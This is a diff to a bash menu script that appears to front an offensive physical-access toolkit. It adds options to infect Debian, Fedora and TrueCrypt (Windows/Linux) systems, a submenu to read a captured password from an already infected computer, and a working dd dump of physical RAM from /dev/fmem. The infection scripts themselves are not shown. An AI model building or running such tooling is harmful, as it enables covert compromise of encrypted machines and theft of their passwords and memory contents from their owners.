@@ -11,41 +11,77 @@ function display_menu
     echo "   1) Run a bash"
     echo "   2) Dump memory"
     echo "   3) Infect Debian"
+    echo "   4) Infect Fedora"
+    echo "   5) Infect TrueCrypt (Windows/Linux)"
 }
 
 
-function run_bash
+run_bash()
 {
-    /bin/bash
+    echo "You can relaunch this menu in /usr/bin/menu.sh"
     exit 0
 }
 
 
-function dump_memory
+dump_memory()
 {
-    data_name="/dev/sda2"
-    data_target="/mnt/data"
-    echo "Mounting $data_name to $data_target  .."
-    mount $data_name $data_target
+    data_target="/dump/"
+    
     totalMem=`cat /proc/meminfo | grep MemTotal | tr -d -c 0-9`
     totalMem=$(($totalMem/1000))
     echo -n "How MB do you want to dump ? (RAM is $totalMem MB )  "
     while read value; do
         if [ $value -lt $totalMem ] && [ $value -gt 0 ];then
             echo "Dumping memory .."
-            dd if="/dev/fmem" of="$data_target/mem_dump" bs=1MB count=$value
+            dd if="/dev/fmem" of="$data_target/dump`date +%x%X`.dd" bs=1MB count=$value
             return 0
         else
             echo "Invalid value, try again"
         fi
     done
+
 }
 
-function infect_debian
+infect_debian()
 {
     echo "Launching infection .."
     /usr/bin/debian_infection/infect.sh
 }
+
+infect_fedora()
+{
+    echo "-- Choose an option:"
+    echo "   1) Infect"
+    echo "   2) Read password (The computer should be already infected)"
+   
+   while read response; do
+        case $response in
+            "1")
+                echo "Launching infection ..."
+                /usr/bin/debian_infection/infect.sh
+                break
+                ;;
+           "2")
+                echo "Try to read password ..."
+                /usr/bin/debian_infection/get_password.sh
+                break
+                ;;
+            *)
+                echo "Choose 1 or 2"
+                ;;
+        esac
+    done
+}
+
+
+
+
+infect_truecrypt()
+{
+    echo "Launching infection .."
+    /usr/bin/infect-tc.sh 
+}
+
 
 
 display_menu
@@ -62,6 +98,14 @@ while read LINE; do
             ;;
         "3")
             infect_debian
+            display_menu
+            ;;
+        "4")
+            infect_fedora
+            display_menu
+            ;;
+        "5")
+            infect_truecrypt
             display_menu
             ;;
         *)
